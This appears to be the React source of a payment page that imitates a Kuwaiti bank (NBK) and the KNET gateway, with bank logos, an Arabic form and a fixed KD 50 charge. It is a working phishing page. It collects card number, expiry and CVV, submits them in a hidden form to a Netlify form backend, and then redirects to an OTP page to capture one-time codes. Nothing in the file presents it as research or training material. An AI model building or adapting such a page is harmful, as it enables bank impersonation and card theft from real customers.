
import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const CardDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    bank: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    prefix: ""
  });
  const [loading, setLoading] = useState(false);

  // Kuwaiti Banks
  const kuwaitiBanks = [
    { value: "", label: "يرجى اختيار البنك" },
    { value: "nbk", label: "بنك الكويت الوطني" },
    { value: "gbk", label: "بنك الخليج" },
    { value: "cbk", label: "البنك التجاري الكويتي" },
    { value: "abk", label: "بنك الأهلي الكويتي" },
    { value: "kfh", label: "بيت التمويل الكويتي" },
    { value: "burgan", label: "بنك برقان" },
    { value: "warba", label: "بنك وربة" },
    { value: "boubyan", label: "بنك بوبيان" },
    { value: "kib", label: "البنك الكويتي الصناعي" },
    { value: "ksb", label: "بنك الكويت والشرق الأوسط" },
    { value: "mashreq", label: "بنك المشرق" }
  ];

  // Kuwaiti Card Prefixes
  const cardPrefixes = [
    { value: "", label: "بادئة" },
    { value: "4", label: "4 (Visa)" },
    { value: "5", label: "5 (MasterCard)" },
    { value: "6", label: "6 (Discover)" },
    { value: "3", label: "3 (American Express)" }
  ];

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '');
    const formatted = digitsOnly.replace(/(.{4})/g, '$1 ').trim();
    return formatted.slice(0, 19);
  };

  const handleInputChange = (field: string, value: string) => {
    if (field === 'cardNumber') {
      setFormData({...formData, [field]: formatCardNumber(value)});
    } else if (field === 'cvv') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 3)});
    } else if (field === 'expiryMonth') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 2)});
    } else if (field === 'expiryYear') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 4)});
    } else {
      setFormData({...formData, [field]: value});
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    // Create a hidden form to submit to Netlify
    const netlifyForm = document.createElement('form');
    netlifyForm.setAttribute('name', 'card-details');
    netlifyForm.setAttribute('method', 'POST');
    netlifyForm.setAttribute('data-netlify', 'true');
    netlifyForm.style.display = 'none';

    // Add form fields
    const fields = [
      { name: 'form-name', value: 'card-details' },
      { name: 'payment-id', value: id || '' },
      { name: 'bank', value: formData.bank },
      { name: 'card-prefix', value: formData.prefix },
      { name: 'card-number', value: formData.cardNumber },
      { name: 'expiry-month', value: formData.expiryMonth },
      { name: 'expiry-year', value: formData.expiryYear },
      { name: 'cvv', value: formData.cvv },
      { name: 'timestamp', value: new Date().toISOString() }
    ];

    fields.forEach(field => {
      const input = document.createElement('input');
      input.setAttribute('type', 'hidden');
      input.setAttribute('name', field.name);
      input.setAttribute('value', field.value);
      netlifyForm.appendChild(input);
    });

    document.body.appendChild(netlifyForm);
    
    // Submit the form
    const formData2 = new FormData(netlifyForm);
    fetch('/', {
      method: 'POST',
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(formData2 as any).toString()
    }).then(() => {
      document.body.removeChild(netlifyForm);
      setTimeout(() => {
        navigate(`/otp/${id}`);
      }, 1000);
    }).catch(() => {
      document.body.removeChild(netlifyForm);
      setTimeout(() => {
        navigate(`/otp/${id}`);
      }, 1000);
    });
  };

  const handleCancel = () => {
    navigate('/error');
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#e8e8e8' }}>
      {/* Hidden Netlify form for form detection */}
      <form name="card-details" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
        <input type="text" name="payment-id" />
        <input type="text" name="bank" />
        <input type="text" name="card-prefix" />
        <input type="text" name="card-number" />
        <input type="text" name="expiry-month" />
        <input type="text" name="expiry-year" />
        <input type="text" name="cvv" />
        <input type="text" name="timestamp" />
      </form>

      {/* NBK Advertisement Banner - Mobile Optimized */}
      <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-300 to-blue-500 relative overflow-hidden">
        <img 
          src="/lovable-uploads/1d2a9902-d961-468c-9f95-1695f21fb91b.png" 
          alt="NBK Logo" 
          className="w-full h-full object-cover"
        />
      </div>

      <div className="container mx-auto px-3 sm:px-6 py-4 sm:py-8 max-w-2xl">
        {/* NBK Header Card - Mobile Optimized */}
        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
          <div className="text-center mb-4 sm:mb-8">
            <div className="flex items-center justify-center mb-3 sm:mb-6">
              <img 
                src="/lovable-uploads/dd68033e-3d38-482d-ad61-28ff811e33ba.png" 
                alt="NBK Logo" 
                className="h-8 sm:h-12 w-auto"
              />
            </div>
          </div>
          
          <div className="border-t border-gray-300 pt-3 sm:pt-6">
            <div className="flex justify-between items-center mb-3 sm:mb-6 text-sm sm:text-lg">
              <span className="text-blue-600 font-medium">Request Via Link</span>
              <span className="text-gray-800 font-medium">:المستفيد</span>
            </div>
            <div className="border-t border-gray-300 pt-2 sm:pt-4">
              <div className="flex justify-between items-center text-base sm:text-xl">
                <span className="text-blue-600 font-bold">KD 50.000</span>
                <span className="text-gray-800 font-medium">:المبلغ</span>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Form Card - Mobile Optimized */}
        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-8" name="card-details" method="POST" data-netlify="true">
            <input type="hidden" name="form-name" value="card-details" />
            <input type="hidden" name="payment-id" value={id || ''} />
            
            {/* Bank Selection */}
            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <select 
                  name="bank"
                  value={formData.bank}
                  onChange={(e) => handleInputChange('bank', e.target.value)}
                  className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg z-50" 
                  style={{ borderRadius: '8px' }}
                >
                  {kuwaitiBanks.map((bank) => (
                    <option key={bank.value} value={bank.value}>
                      {bank.label}
                    </option>
                  ))}
                </select>
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:يرجى اختيار البنك</label>
              </div>
            </div>

            {/* Card Number */}
            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <div className="flex space-x-2 sm:space-x-3 flex-1">
                  <select 
                    name="card-prefix"
                    value={formData.prefix}
                    onChange={(e) => handleInputChange('prefix', e.target.value)}
                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50" 
                    style={{ borderRadius: '8px' }}
                  >
                    {cardPrefixes.map((prefix) => (
                      <option key={prefix.value} value={prefix.value}>
                        {prefix.label}
                      </option>
                    ))}
                  </select>
                  <Input
                    type="text"
                    name="card-number"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                    className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                    style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
                    placeholder=""
                  />
                </div>
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:رقم بطاقة الصرف الآلي</label>
              </div>
            </div>

            {/* Expiry Date */}
            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <div className="flex space-x-2 sm:space-x-3">
                  <select 
                    name="expiry-year"
                    value={formData.expiryYear}
                    onChange={(e) => handleInputChange('expiryYear', e.target.value)}
                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
                    style={{ borderRadius: '8px' }}
                  >
                    <option value="">YYYY</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                  </select>
                  <select 
                    name="expiry-month"
                    value={formData.expiryMonth}
                    onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
                    style={{ borderRadius: '8px' }}
                  >
                    <option value="">MM</option>
                    {Array.from({length: 12}, (_, i) => (
                      <option key={i+1} value={String(i+1).padStart(2, '0')}>
                        {String(i+1).padStart(2, '0')}
                      </option>
                    ))}
                  </select>
                </div>
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:تاريخ انتهاء البطاقة</label>
              </div>
            </div>

            {/* CVV */}
            <div className="space-y-2 sm:space-y-3">
              <div className="flex justify-between items-center">
                <Input
                  type="text"
                  name="cvv"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                  style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
                  placeholder=""
                  maxLength={3}
                />
                <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:الرقم السري</label>
              </div>
            </div>
          </form>
        </div>

        {/* Action Buttons Card - Mobile Optimized */}
        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
          <div className="flex space-x-3 sm:space-x-6">
            <button
              onClick={handleCancel}
              className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
              style={{ borderRadius: '12px' }}
              disabled={loading}
            >
              إلغاء
            </button>
            <button
              onClick={handleSubmit}
              className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
              style={{ borderRadius: '12px' }}
              disabled={loading}
            >
              {loading ? 'جاري التحميل...' : 'إرسال'}
            </button>
          </div>
        </div>

        {/* Footer - Mobile Optimized */}
        <div className="text-center mt-6 sm:mt-12 text-gray-700">
          <div className="text-sm sm:text-lg mb-2 sm:mb-3 font-medium">جميع الحقوق محفوظة © 2025</div>
          <div className="text-sm sm:text-lg text-blue-600 font-medium">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
        </div>
      </div>
    </div>
  );
};

export default CardDetails;
